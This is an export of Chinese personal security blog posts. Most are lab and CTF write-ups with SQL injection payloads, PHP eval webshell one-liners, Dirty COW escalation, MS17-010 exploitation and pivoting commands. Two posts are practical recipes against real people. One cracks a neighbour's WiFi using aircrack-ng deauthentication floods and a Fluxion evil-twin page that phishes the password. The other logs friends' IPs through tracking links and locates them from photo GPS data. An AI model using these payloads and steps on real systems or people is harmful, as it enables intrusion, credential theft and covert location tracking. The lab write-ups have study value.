[{"title":"记一次从web到内网的渗透","date":"2022-06-22T07:36:19.000Z","url":"/2022/06/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8Eweb%E5%88%B0%E5%86%85%E7%BD%91%E7%9A%84%E6%B8%97%E9%80%8F/","content":"记一次从web到内网靶场渗透的过程，靶场还是比较简单，配置流量转发的时候遇到了一点坑多花了点时间 环境全程均为内网靶场环境 攻击方kali（虚拟机），windows10 靶机外网IPweb：10.100.1.107 内网IPOA系统：192.168.223.1 windows_server:192.168.223.2 DB:192.168.223.3 思路因为我们不能直接访问靶机的内网，所以需要拿下web服务器，利用web服务器做跳板，访问内网的IP web服务器进入管理页面首先访问web 点击登录，前端检测必须用户名为XXX@XXX，所以我们随便填一个，burpsuite抓包试试 我们尝试一下万能密码，&#39; or 1=1# 放行流量后直接进入管理后台 文件上传可以尝试找找有没有文件上传这些漏洞，显然它检测文件需要为png，可以看看有没有办法绕过 我们直接上传一个冰蝎马试试 我们修改content-type里面的参数为image&#x2F;png 发现上传成功！ 我们去到头像的目录下，发现生成，admin.php文件，尝试连接上线 提权成功连接，用uname -a看看版本，此linux版本可以利用脏牛漏洞提权（可以百度搜搜脏牛漏洞，很多脚本与教程，我这里就跳过） 上传dirty.c（脏牛漏洞脚本）并使用此代码编译一下gcc -pthread dirty.c -o dirty -lcrypt 获得一个新的dirty文件并./dirty执行 （注：如果报错/tmp/passwd.bak already exists,直接删除再执行一次） 切换新的root用户后，记得mv /tmp/passwd.bak /etc/passwd 上传msf马准备后渗透先制作一个，用冰蝎上传，并监听 去到冰蝎下面执行木马，成功反弹 查看日志，发现内网主机网段：192.168.223.0&#x2F;24 后渗透咱们不可以直接访问内网，先配置一个端口转发 方法（可以使用ew等代理工具，或者msf里面的route） 我们就直接用ssh转发流量，挺稳定的 端口转发因为我们kali无法ping通内网机器，而web服务器可以，所以需要做一个反向代理 用msf把web靶机的22端口转发到本地的3344端口 使用提权后的root账户（firefart）连接kali本地的3344端口，连接成功。说明端口可以成功访问 接下来，我们用ssh -f -N -D 0.0.0.0:1314 firefart@127.0.0.1 -p 3344把流量转到本机1314端口。（不能配置127.0.0.1：1314，否则不能把虚拟机kali的流量转出到windows使用，会很麻烦） 并将端口配置于/etc/proxychains4.conf，待会会用到proxychains 工具 使用proxychains 扫描一下192.168.223.2的端口，发现可以成功扫描，说明我们配置成功，进入内网 寻找内网主机proxychains nmap -sP 192.168.223.0/24 发现存在192.168.223.1、192.168.223.2、192.168.223.3 大致看了下端口， 192.168.223.1(先去看看80端口的服务) 192.168.223.2（445端口可以测试一下ms17_010） 192.168.223.3 第一台先从192.168.223.1开始吧，我们把kali里面的流量转到windows上来，不然不方便。 直接给浏览器配置代理即可 成功访问OA系统，发现随便输入了几个密码，进不去，但是没有错误次数限制，并且给出密码是五位数字，那就简单了，直接爆破。 配置burp跳板机代理 爆破密码00000-99999 开始爆破 爆出密码后进入系统，发现修改page&#x3D;后参数，可以跳转网页 文件包含+文件上传测试一下../../../etc/passwd,存在文件包含漏洞 测试一下头像上传点 我们将后缀直接修改为.png，直接上传成功，我们去检查一下，直接访问头像地址，发现不能被解析 复制头像路径，放在page后面 利用成功~ 我们再上传一句话木马测试一波 上传新的图片马，&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;写入88.php,改名为88.png 上传成功，但是蚁剑，菜刀，说什么都连不上，但是可以利用post data执行命令。 尝试重新写个木马进去，先测试是否可以写入php文件,在双引号里面输入echo 111 &gt; 1.php，再查看 我们写入一句话木马看看，发现写入不成功，估计是有限制 经过几番测试，是对$符号有限制，我们直接把一句话木马，用base64加密，再解密试试 发现写入成功 用蚁剑测试连接，记得先配置代理 成功连接！ 上传msf马准备上传msf马，启动时记得带上proxychains 上传后执行，反弹 第二台192.168.223.2 开放的445端口，我们先测试一下，把之前监听的192.168.223.1至于后台 ms17_010先用scanner扫描一下吧，直接use 4，然后配置options 说明的确存在，我们再use 0，使用第一个打进去 先修改payload OK，直接打进去了，可以开启3398端口，方便咱们连接使用 现在拿下两台内网机器 第三台192.168.223.3 先访问一下 发现是phpmyadmin，肯定连接了数据库。随后我在192.168.223.1的OA系统上找到了数据库的配置文件。里面有用户名和密码，但是此网页登陆不进去，就直接尝试mysql链接吧。 mysql连接成功 写shell查看mysql的版本 首先基础语法查询是否 secure_file_priv 没有限制 输入show global variables like &#39;%secure_file_priv%&#39;; NULL 不允许导入或导出/var 只允许在/var目录导入导出空 不限制目录 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件 在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件 into outfile输入select &#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; into outfile &#39;/var/www/html/123456.php&#39;;，目录是我自己构造的 连接成功 上传msf马 反弹成功 成果web服务器+3台内网机器 "},{"title":"SSRF利用小计","date":"2022-04-14T03:27:00.000Z","url":"/2022/04/14/SSRF%E5%88%A9%E7%94%A8%E5%B0%8F%E8%AE%A1/","content":"SSRF（服务端请求伪造漏洞）1.定义 由于服务端提供了从其他服务器应用获取数据的功能，但又没对目标地址做严格的过滤与限制，导致攻击者可以传入任意的地址来让后但服务器对其发送请求，并返回对该目标地址请求的数据 2.造成漏洞函数file_get_contents():将整个文件或一个url所指向的文件读入一个字符串中 readfile():输出一个文件的内容 fsockopen():打开一个网络连接或者一个Unix套接字连接 curl_exec():初始化一个新的会话 fopen():打开一个文件或者URL 3.攻击中涉及的协议（1）http:?url=过滤不严谨，访问内网 （2）dcit：?url=dict://127.0.0.1:$8080$爆破$$里的端口，然后直接访问 （3）file：?url=file:/var/www/html/flag.php需要知道文件的具体目录 （4）Gopher:构造GET/POST包攻击应用 （5）FastCGI:利用Gopherus （6）Redis：?url=redis://127.0.0.1:6379"},{"title":"CORS跨域劫持漏洞复现记录","date":"2022-04-14T01:30:49.000Z","url":"/2022/04/14/CORS%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/","content":"漏洞介绍：CORS跨域劫持漏洞 url&#x3D; CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。通过该标准，可以允许浏览器向跨源服务器发出 XMLHttpRequest 请求，从而克服了AJAX只能同源使用的限制，进而读取跨域的资源。CORS允许Web服务器通知Web浏览器应该允许哪些其他来源从该Web服务器的回复中访问内容 漏洞产生原因：在Access-Control-Allow-Origin中反射请求的Origin值。该配置可导致任意攻击者网站可以直接跨域读取其资源内容。 漏洞检测：1.POC：curl  -H “Origin: ; -I 出现以下信息即有漏洞存在 2.burp发包添加 Origin: 参数 若返回以下，则存在 Access-Control-Allow-Origin: xxxxx.comAccess-Control-Allow-Credentials: true 漏洞利用：1.构造钓鱼html，在箭头位置输入目标url 同于csrf跨站请求伪造，发送钓鱼链接，读取用户敏感数据。 2.使用phpstudy打开网页 对比目标网页下的信息 "},{"title":"CTFHUB 【第二章web进阶-Web文件上传漏洞】","date":"2022-03-14T08:43:14.000Z","url":"/2022/03/14/CTFHUB%20%E3%80%90%E7%AC%AC%E4%BA%8C%E7%AB%A0web%E8%BF%9B%E9%98%B6-Web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E3%80%91/","content":"先上题目源码 得知上传限制： 1.仅允许上传zip、jpg、gif、png文件! 2.如果上传压缩包，压缩包内不允许含有php文件 信息收集和代码分析限制1 apache存在的多后缀文件解析漏洞，这里上传一个任何不可识别的后缀都行（如：x.php.xxx），都可绕过该正则限制 限制2 接合上面未截出的代码得知，check_dir作用于upload文件夹以下，将解压出的文件穿越到非upload目录，check__dir将无法删除文件 zip压缩包被解压到/upload/随机md5/目录下，由此可得知手动几乎不可能找到随机的文件夹，需要穿越两个目录 构造压缩包再此之前试过其他绕过方法后行不通，开始尝试使用压缩包来绕过 将之前的PHP马改成123123123.php.XXX,文件名留够/../../的位置,以便穿越，后缀随便，我jpg是因为之前测试用的，就不改了 压缩后得左边的压缩包，并把压缩包放入010EditorPortable.exe，修改压缩包内的文件名 上传测试，右边返回的是（上传成功！） 到url下获得flag，看见zip解压出来的文件，即绕过成功 "},{"title":"知识小记2","date":"2022-03-14T04:39:39.000Z","url":"/2022/03/14/%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%B02/","content":"网络安全知识小计-2ssrf 利用方法ssrf服务端请求伪造，利用web端攻击内网 常用利用协议 何处可能存在SSRF漏洞能够对外发起网络请求的地方，就可能存在SSRF漏洞从远程服务器请求资源(Upload from URL，Import &amp; Export RSS Feed)数据库内置功能(Oracle、 MongoDB、MSSQL、 Postgres、 CouchDB)Webmail收取其他邮箱邮件(POP3、 IMAP、SMTP)文件处理、编码处理、属性信息处理(ffmpeg、 ImageMagic、 DOCX、 PDF、 XML) 如何突破延时盲注的时间利用dns注入快速获取数据，使用sqlmap结合dnslog 内网确定域控判断是否在域中 定位域控 文件上传绕过1.对文件的内容，数据。数据包进行处理 2.通过替换大小写来进行绕过 3.通过删减空格来进行绕过 4.通过字符串拼接绕过 5.双文件上传绕过 6.HTTP header 属性值绕过 7.HTTP header 属性名称绕过 8.等效替换绕过 9.修改编码绕过 sqlmap –os-shell原理就是用into outfile函数将一个可以用来上传的php文件写到网站的根目录下，然后利用tmpukjhb.php上传了一个tmpbezal.php的文件，tmpbezal.php这个文件可以用来执行系统命令，并且将结果返回出来 os-shell的执行条件有三个 （1）网站必须是root权限 （2）攻击者需要知道网站的绝对路径 （3）GPC为off，php主动转义的功能关闭"},{"title":"计算机取证与司法鉴定小计-1","date":"2022-03-11T00:46:03.000Z","url":"/2022/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81%E4%B8%8E%E5%8F%B8%E6%B3%95%E9%89%B4%E5%AE%9A%E5%B0%8F%E8%AE%A1-1/","content":"无损取证原则有两层含义1.保证证据无损 （备份） 2.证明证据无损 （hash） hash技术是证明无损的主要方法 每一步都要进行hash运算，以便与原磁盘文件做对比，确保无损。 电子取证和数字取证的区别电子取证针对电子数据，电子数据含模拟和数字两类 数字取证针对数字数据，计算机取证针对计算机产生的数字数据 电子取证范围最大，计算机取证范围最小 计算机取证分为：司法取证和企业内部取证 数字图像篡改的六种主要方法（1）合成（2）图像局部信息修改（3）润饰 （4）变形技术（5）计算机图形学技术（6）绘画 数字媒体防伪认证的方法1.主动认证：水印认证、数字签名认证（鲁棒HASH认证） 2.被动认证 网络取证的概念网络取证则不同，其主要针对的是计算机网络，调查的重点在于各种网络设备（服务器、路由器、防火墙、入侵检测系统等），也即主要是通过对各种网络行为的调查和分析，从而获取与案件相关的证据。 比如网络取证，我们要调查核心交换机主要查 日志 我国网络安全法明确规定，重要信息系统，日志至少保存6个月 申请计算机搜查的基本条件是什么？1.理由正当 2.找对的人审批 3.仔细确定审批范围（最重要，确定后不能更改） 申请计算机搜查的基本条件（1）合法取证 *四要素：主体、对象、过程、手段（对于主体和对象合法，主要是依靠我们的授权， 企业内部取证调查就要靠取证授权）* （2）无损取证 （3）全面取证 （4）及时取证 计算机取证的实施过程有哪些关键阶段？案件受理、取证准备、处理现场、搜集证据、固定证据、 证据保存、证据分析、报告生成、证据归档和证据显示与质证"},{"title":"CTFHUB-SQL注入-2","date":"2022-03-01T16:35:30.000Z","url":"/2022/03/02/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/","content":"CTFHUB-SQL注入-2思维小计函数解析updatexml() 通过这个函数 可以让mysql产生报错信息 但是 还是会执行这个查询语句 查询的结果会跟报错信息一起返回 0x7e 是~的十六进制，用于显示完整信息，避免被吃 步骤1.F12查看页面注释，有提示，在url中加入?tips=1出现报错信息 2.burp抓包尝试在name后加上&#39;,会出现报错 ![1](E:... This is Uknow—JJ\\A一些小记录\\notes\\博客图片\\1.png) 3.order by 4会报错，确定只有三列，这是一个报错注入 4.用updatexml函数进行报错返回值 构建语句发现只返回了一个~ 发现中间这个值才会被返回 于是构造函数 123&#39; and updatexml(1,concat(0x7e,(select 1)),1)# 查出库名为note 123’ and updatexml(1,concat(0x7e,(select database())),3)# 构造语句 name=123&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from information_schema.tables where table_schema=’note‘)),1)#&amp;pass=xxxx 原因：select被过滤双关键字绕过 selselectect payloadname=123&#39;and updatexml(1,concat(0x7e,(selselectect(flag)from fl4g)),1)#&amp;pass=xxxx"},{"title":"知识小记","date":"2022-02-22T07:15:24.000Z","url":"/2022/02/22/%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%B0/","content":"网络安全知识小计-1数据库提权MOF提权：nullevt.mot每分钟执行一次，写入CMD命令，则会执行 UDF提权： 调用自定义函数 启动项提权： 用 MySQL 将自定义脚本导入到启动项中 IPS&#x2F;IDS&#x2F;HIDSIDS 入侵检测系统 HIDS基于主机，检测文件和应急响应等IPS 入侵防御系统 linux、windows命令：过滤文件、查看进程环境变量linux：第一步：获取进程pid​ ps -ef | grep 进程名​ 第二部：cat /proc/pid(进程ID)/environ​ 输出进程环境变量 win：查看 set path 添加 set 变量名=变量内容 WAF及其绕过方式WAF特性、脏字符（大小写，注释符，编码绕过等） shiro反序列化shiro提供rememberme这个功能，会生成一个进行序列化的cookie，下次登陆可以通过识别cookie登陆。获取cookie后构造恶意代码，加密后作为cookie发送，服务端接收后出发反序列化漏洞 Sql注入的分类布尔盲注：只能从应用返回中推断语句执行后的布尔值 时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断 报错注入：应用会显示全部或者部分的报错信息 堆叠注入：加入 ; 后一次执行多条语句 还有 宽字节注入、base64注入、cookie注入、XFF注入 Mysql如何getshell（1）利用into outfile写入木马文件 （2）利用日志文件写入木马 1.开启日志功能 2.设置日志存储路径 3.执行sql语句 Xss分类存储：储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。 Dom：一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生 反射：反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发 CSRF：跨站点请求伪造，基于xss，冒充用户发起请求 SSRF：服务端请求伪造 XEE：在应用程序解读XML时，允许引入外部实体，就可以构造恶意内容，造成读取恶意文件，代码执行，端口探测…. 文件上传、文件包含、目录遍历文件上传：利用文件上传功能上传可执行脚本文件，文件上传还可能导致其他问题，比如上传超大文件造成占用带宽占满磁盘等 文件包含：includ,require等函数可以加载远程文件，如果没有进行过滤，则执行文件的恶意代码 目录遍历：搜索包含index of标题的网页，网站目录可以被任意浏览 任意文件读取&#x2F;下载： 将文件变量改成../../etc/passwd等形式，下载预期外文件的漏洞 栈溢出攻击向缓冲区填入大量输出，造成溢出。利用缓冲区溢出改写代码，改变程序执行流程，执行shellcode"},{"title":"布尔盲注某个payload的拆解分析","date":"2021-12-27T10:09:06.000Z","url":"/2021/12/27/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90%E4%B8%AApayload%E7%9A%84%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/","content":"布尔盲注某payload拆解分析学习的时候为了理解写的小水文，如果写的不好，望理解，嘿嘿~🤭 重点函数ord() 转换成ASCII码 mid(string，n，1) AND substr(string，n，1) 截取字符串第n位 left(sting，n) 截取字符串的前n位 示例异或 函数分析group_concat() 可以组合多个字符串 information_schema.tables 查表 information_schema.columns 查列 substr(sql语句返回的值,n,1) 截取字符串，查看数据库库名的第n位，字长为1 ord 函数返回[字符串]第一个字符的 ASCII码值。通过ASCII码确定数据库名【ord(mid(查询语句))】 语句分析table_name 是表名 table_schema 是库名 information_shcema 可看作为数据库名，表明，数据类型，权限等这些的数据库 查表：select(group_concat(table_name))from(information_shcema.tables)where(table_schema=databases())返回ASCII码：ord(mid(SQL语句查询的表名))"},{"title":"Linux搭建nfs共享文件夹服务","date":"2021-12-18T04:11:39.000Z","url":"/2021/12/18/Linux%E6%90%AD%E5%BB%BAnfs%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9C%8D%E5%8A%A1/","content":"如果没有公网IP可以自己创建两个虚拟机测试： 假设CP1 ip：192.168.3.102假设CP2 ip:192.168.3.0 一、先关闭CP1防火墙吧 systemctl stop firewalldsystemctl disable firewalld二、CP1 CP2 都执行： yum -y install nfs*yum -y install rpcbind*三、在CP1里面：创建共享文件夹 share1vim /etc/exports添加如下命令（自己记得改IP） /root/share1 192.168.3.0/255.255.255.0(rw,sync,all_squash)(修改了此命令记得重新启动一下nfs rpcbind服务，否则不会更新你修改的) 四、在CP2里面：root目录下创建文件夹 share2 五、CP1 CP2 都执行：启动nfs和rpcbindrpc先启动nfs后启动，顺序不对会导致服务器报错 systemctl start rpcbindsystemctl start nfs 设置nfs及rpcbind开机自启 systemctl enable nfssystemctl enable rpcbind 六、在CP2上执行：可以用status确认showmount -e 192.168.3.102 开始挂载：mount -t nfs 192.168.3.102:/root/share1 /root/share2前面是CP1的文件路径，后面是CP2的文件路径 df -h查看是否挂在成功 注：可以在CP1或CP2下创建文件夹或者创建文件测试一下，若两边主机都可以查看到则成功如果不成功需要赋予权限,CP1执行：chown -R nfsnobody:nfsnobody /root/share1"},{"title":"移动端安装kali","date":"2021-01-27T03:39:41.000Z","url":"/2021/01/27/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%AE%89%E8%A3%85kali/","content":"（此文章从我自己CSDN账号上复制过来的） 首先，你需要的装备1.一部手机or一部平板（反正便于携带的）最好是安卓 （ios有一定限制，其实也可以，但是步骤长，需要海外ID） 2.你的装备需要root （华为最近出的产品就不要用了，貌似华为拒绝了root了，没root的话nmap都用不了了） 这就是我测试的几台机器 一、如果你是安卓5以下的版本,请看（第一章） 二、如果你是安卓5以上的版本,请看（第二章） 安卓5以上，且可以root的是最舒服的了，简单，步骤少，可惜我无缘，昨天耗费五个小时才发现是因为我没root权限被限制了，我以为是各种配置文件出错挨着改 三、如果你是IOS系统请看（第三章） 第一章准备工作 下载下列软件安装在手机上（直接百度既有）： \\1. Linux deploy 系统支撑软件 （下载的只要你手机可以安装就可以，因为你可能安卓版本过低有的不能安装，多尝试下载几个，只要可以用就可以） \\2. Busy Box 支撑软件 \\3. ConnectBox 或者 IJuiceSSH（我用的这个） 手机端SSH连接软件 BusyBox安装完毕后，运行Busy Box，看到如下界面： 按照顺序做，先点击右上角三个点，按照图2 ![img](E:... This is Uknow—JJ\\A一些小记录\\notes\\博客图片\\clip_image010.png) 在设置界面中还可以设置其他参数，看个人喜好，但注意不要修改安装路径，如非要修改，则需要记住修改后的路径，后续步骤需要使用。 如果你下载的是pro，也可以，我安装好是这样的（我就是这样的） Linux deploy（当你搭建好了，你就是用下一个软件用本地IP对这个软件进行本地连接，当然，你电脑也可以连接你手机，直接看你手机IP，反之，你手机也可以连接电脑搭建的SSH服务） 运行完毕Busy Box的部分后，运行Linux deploy。 点击左图左上角部分，选择设置 ![img](E:... This is Uknow—JJ\\A一些小记录\\notes\\博客图片\\clip_image016.png) 在设置界面中找到PATH变量，赋予其值 &#x2F;system&#x2F;xbin 注意这是Busy Box的安装路径，如果前面在Busy Box有修改默认安装路径的话，就要填写修改后的路径。 设置界面其余部分看个人喜好设置，建议开启锁定Wifi功能。 接着退回主界面，点击左图右下角部分。 点击后看到如上界面，对Linux系统安装信息进行配置。 发行版看个人喜好选择（我选择是kali） 架构需要根据手机硬件选择，一般会默认选择好匹配的选项，所以建议默认选项 源地址是指Linux系统文件下载源的网络地址，默认是发行版的国外官方源，网速堪忧，建议换上国内源，（建议和我一样，阿里云的） 该勾选的就是下面这些，勾选上 · 安装路径是Linux系统的安装路径，如要安装在手机自带的存储空间中，则在路径开头加上${ENV_DIR}，这代表的是存储空间根目录。如要安装在sdcard中，则加上${EXTERNAL_STORAGE}。 · 文件系统推荐ext4，但保留默认也可以。 · 用户名和密码自定义，本地、远程连接该系统用。 · DNS如需自定义就自行输入，否则保留默认 本地化即设置系统语言，简体中文选择zh_CN.UTF-8 挂载功能可让Linux系统访问手机上的文件 挂载列表中添加访问手机内容的目录，&#x2F;sdcard:sdcard为手机自带存储空间根目录，&#x2F;storage&#x2F;sdcard1为sd卡根目录。 退出系统设置界面，点击主界面右上角，选择安装。 等待程序自行安装Linux系统，时间不定，看到&lt;&lt;&lt;deploy则安装完毕。如果中间没有报错则安装成功。 注意：安装完毕后要先点击停止按钮，再按启动按钮 IJuiceSSH****（ConnectBot同理）启动后运行IJuiceSSH，点击主界面 \\1. 连接，再点击其中右下角的加号 \\2. 输入昵称，root（之前linuxdeploy里面配置的用户名），地址localhost 干脆看我图就好了，填好了点勾勾，然后连接，会提示什么什么密匙，确定就OK，输入密码，是之前linuxdeploy里面配置的密码，出现下面就登陆成功，如果没有，就看linuxdeploy是否开启服务（直接看命令里面哪一行出现了fail，出错了就改） apt-get update 执行一下，更新一下源 apt-get install nmap 我下载了一个nmap试了一下是否成功拥有使用工具的权限，答案是可以的，试了好多办法终于成功了（接下来几个就是掉坑教学了，但是只要按我说的做方法可行） 第二章安卓5以上，且可以root的是最舒服的了， termux可以直接百度搜步骤，也许比我还详细更适合你，方法也很多，这个坑不是很多，简单 准备工作 下载下列软件安装在手机上（直接百度既有）： 1.首先先下载Termux 打开就是一个黑乎乎的代码执行页面 2.接着跟着我执行代码（复制粘贴就可以了，幸福吧，如果是PDF不能复制或者你截图识别文字出来就可以了）， （下面我讲解的是atilo安装kali，其实也有其他办法，我也试过，都一样，如toolss，如果你使用这个安装也可以，只要能安装起就行了） 3.差点忘了！你得有python环境才能运行安装的步骤，分别先后执行下面两个代码： pkg update pkg install python3 如果pkg不行就得换源 apt edit-source，把新的源加进去（百度阿里云，中科大的源，复制粘贴进去然后ESC后输入：wq回车既可以保存，再重新执行，或者用wget，git等命令下载python压缩包再解压,反正可以百度） 步骤 1.获取权限 pkg install proot` `termux-chroot 2.安装git并获取atilo（toolss一样的） &#96;&#96;&#96;pkg install git&#96; git clone `` 3.进去atilo下并获取权限 cd atilo/ （到此目录） chmod +x atilo 4.安装kali ./atilo install kali (必须有python环境) 此处有个坑，可能报错说你缺少reuqests 或者 bs4 等 直接 pip install requests(你缺少的)，直到它不报错，因为这是个新搭建的，肯定缺少很多文件，缺少就补上，这就是个慢慢挖坑填坑的过程！！！！！！！！！！ 成功图如上 5.接着cd到你的atilo文件夹下面 ./atilo run kali （或者startkali） 执行一下启动kali，以后每次进入kali都需要这个步骤 上图即为成功启动，进入kali 我是保存在Python-3-7.1目录下面的 因为我之前为了避坑，移过去的，结果发现是缺少环境，所以大家的直接下载 （后来为了验证我也直接在根目录下下载了一个也可以使用，红箭头画出来） 的应该直接执行cd atilo开始的就看了。 进入了kali，至于能干什么，就不多说了 例：metasploit 第三章Ios的，最脑袋疼的 两个办法，都恼火，简单说说思路吧 方法一： 准备工作 1****，安装应用TestFlight · testflight.apple.com&#x2F;join&#x2F;97i7KM8O 浏览器访问链接，开始测试。 2，安装 iSH shell3，运行 iSH shell 它什么都没有，所以需要安装基本git、wget、vim、nano、tar、zip、less等 &#96;&#96;&#96;.apt install git .apt install wget .apt install vim .apt install nano .apt install tar&#96; .apt install less&#96;&#96; 配置iSH（1） 更新国内源 vi &#x2F;etc&#x2F;apk&#x2F;repositories 采用国内阿里云的源，将其文件内容修改为： #  #    编辑好后按ESC退出，输入:wq保存修改并退出 （2）更新源： apk update apk upgrade 然后你可以开始慢慢配置你的武器库，但是会缺少各种文件，就得慢慢花时间了。 但是这个软件简单做些linux操作还是可以的，至于渗透，那就是花功夫了，我被他磨平了棱角 方法二（不介意IOS14，utm性能下降）iOS 11～iOS 13.3 安装一个软件叫做UTM 我在youtube看的教学视频，其他办法可以搜搜其他的，我不知道可以不 首款 iOS 虚拟机 UTM - 免越狱在 iPhone iPad 上安装 Windows &#x2F; Linux &#x2F; 安卓系统 （虚拟机！！！！！！说明了什么，他是一个手机版的VMware！！！！！！！！说明了我只需要把电脑上的镜像拖进去就可以直接开始了，说明了你安装windows系统你可以在上面玩PC游戏） 对于国人来说其实最大的难题就是安装UTM 不过安装过程属实脑血栓，准备好梯子和新海外的苹果ID吧 首先，安装它 \\1. 在你的电脑上安装第三方应用商店Altstore （1. 通过电脑端给你手机安装手机端的Altstore （2. 在里面添加UTM软件源 ） （3. 添加后就可以看见UTM的下载按钮了 \\2. 但是接下来有几个门槛 （1. 首先你的APPLE ID 需要开启双重验证，不是两步验证 （2. 生成开发者证书来签名此软件） 还有另一个方法xcode，用苹果的系统来签名，我没MACbook就不能搞了 3.安装好就可以打开 打开点击右上角+配置文件以及镜像，按照图就可以了 4.跟着图来 ，点击 path这个，到达图2 点击右上角+选择镜像, 这里添加的是arch linux 镜像，大家安装kali的就添加kali镜像即可 然后确定后返回主页 点击运行，开始配置系统 终于写完了，大概，能在手机上弄得就只有这些方法了，我只查到了这些，可能还有其他的办法，大家可以自己再看看，总而言之，挺恼火的，我现在只有一个设备是正常可以搭建起kali并使用工具的"},{"title":"整蛊朋友小笔记-1","date":"2020-09-18T03:58:52.000Z","url":"/2020/09/18/%E6%95%B4%E8%9B%8A%E6%9C%8B%E5%8F%8B%E5%B0%8F%E7%AC%94%E8%AE%B0-1/","content":"一个20年的小笔记（获取朋友IP，查到朋友所在地方） 今天整理电脑突然发现之前整蛊朋友的一个小笔记，随手记录一下，留个纪念。 一、钓鱼朋友IP1.链接生成网址： 2.生成链接或二维码或图片分给别人 3.发送给别人点击准备钓鱼 4.在结果页面查看点击者IP 5.IP查询网址：（亲测精准）或可以查经纬度  二、图片查询定位1.用（自带的照片浏览器！！）打开别人发给你的原图照片！！！！！！原图（否则会被腾讯吃掉）2.保存图片3.元数据编辑器查看GPS（MagicEXIF）4.换算经纬度，定位经纬度"},{"title":"kali获取WIFI密码小计","date":"2020-07-18T04:00:47.000Z","url":"/2020/07/18/kali%E8%8E%B7%E5%8F%96WIFI%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%A1/","content":"如何使用kali-linux得知隔壁房间WIFI密码下面主要介绍aircrack-ng,fluxion两个方法。还有wifite也挺好用，当然还有很多方法 （此文章从我自己CSDN账号上复制过来的） 注意:1.新手上路，大佬们多多指教，嘻嘻2.此贴仅为教程贴，拿自家WIFI测试，禁止使用此技术干违法or伤害他人行为的事情！！！！ 工具准备kali-linux无线网卡（有监听功能的），我用的是Ralink802.11 n可以直接某宝搜索linux免驱网卡 步骤：1.插入网卡选择把网卡接入虚拟机 2.在命令窗口输入ifconfig查看网卡是否启动，如果有wlan0则为启动成功（有的不叫wlan0，可以搜索更改教程我就不演示了） 如果没有请看看虚拟机右下角USB接口是否亮着，是否接入成功，或者iwconfig查看一下是否有网卡 方法1（使用Aircrack-ng）1.airmon-ng start wlan0(你的叫什么就写什么，我是wlan0)2.ifconfig查看是否wlan0变成了wlan0mon，是的话就是启动成功 4.airodump-ng wlan0mon开启监听，并选择你要攻击的WIFI（复制他的mac地址以及通信道到下一步） 5.然后使用airodump-ng -c 11 –bssid 04:95:E6:23:B5:41 -w &#x2F;root&#x2F;wsb&#x2F;123 wlan0mon抓取握手包，-w后跟的是存放握手包目录，-c跟的是通信道，–bssid跟的是MAC地址 6.此时以上都做好了，如果监听不到握手包，或者你懒得等了，直接采用暴力模式，洪水攻击（使它短断网，获得重新连接WIFI的机会从而握手一次，如果你要让他一直断网那你就多开几个攻击挂着吧，小心被打）aireplay-ng -0 0 -a 04:95:E6:23:B5:41 wlan0mon，-a跟的是mac地址，获得握手包后记得按ctrl+c取消攻击 出现 WPA handshak就抓取成功了. 7.使用字典爆破出WIFI密码（你需要一个好字典）aircrack-ng -w &#x2F;root&#x2F;zd&#x2F;wifi_top2000_passwd.txt &#x2F;root&#x2F;wsb&#x2F;123-01.cap （前为你字典目录，后为握手包目录）爆破出来的wxb…就为我wifi密码，当然复杂的密码可能不存在字典里面，可能需要多个字典，或者自己使用kali里的工具生成一些字典尝试爆破，爆破对于简答密码很快，复杂的就不一定。如果不行就换第二个方法吧 方法二（fluxion）1.同样先插入网卡，ifconfig查看是否启动成功2.cd fluxion&#x2F;进入目录，再.&#x2F;fluxion启动程序（如果fluxion没安装，尝试git clone  ，可能会差一些组件，自己安装就好了，得全部环境配置好才能使用）3.输入.&#x2F;fluxion后进入页面，选择中文吧，简单些。4.选择你的网卡，直接3，回车，扫描所有通信道，扫描附近的WIFI，看见你需要找的WIFI后，按ctrl+c停止扫描，选择你要测试的WIFI 5.先获取握手包，所以先选择2 6.选择攻击方式，我都直接aireplay-ng,懒得花时间监听了，直接断网攻击，mdk3也是断网攻击，它有个小功能占领通信道时间长了可以使周围的无线路由器全部宕机，我试过一次，开了一晚上，然后网卡给我烧了，可能是我的网卡太垃圾了。 7.选择验证 8.三十秒一次（其实获取握手包你嫌慢，步骤多，你可以使用方法一的获取方法配合使用），同步验证 9.开始攻击了，注意看左下角是否获取握手包，获取了就可以了，等待，说实话我觉得慢，还不如配合方法一使用，看情况吧 10.获取成功，选择进攻方式 11.选择创建wifi钓鱼网站（使别人不能连上自己家WiFi，再创建一个同名字WiFi，诱骗别人输入wifi密码） 这就是刚才的握手包 12.跟着绿色选择就可以了，其他为备用方法 13.跟着选择 建议选择中文，除非wifi某个人英语不错 14.我手机的wifi突然被断开，连接不上了，我得进入wifi界面去重新找以下WiFi，连接WiFi（始终不能连上以前的WiFi，但是有个同名WiFi，点击连接会跳出以下网站，123-5G是我另外一个wifi，可以忽略当作其他名字的wifi。可以看见123只有一个没有加锁的）正常连接家里WiFi情况是这样的 被攻击后 监听中 当我一脸懵逼在手机上输入wifi密码后，可以看见右上角，密码出现并保存在蓝色目录中 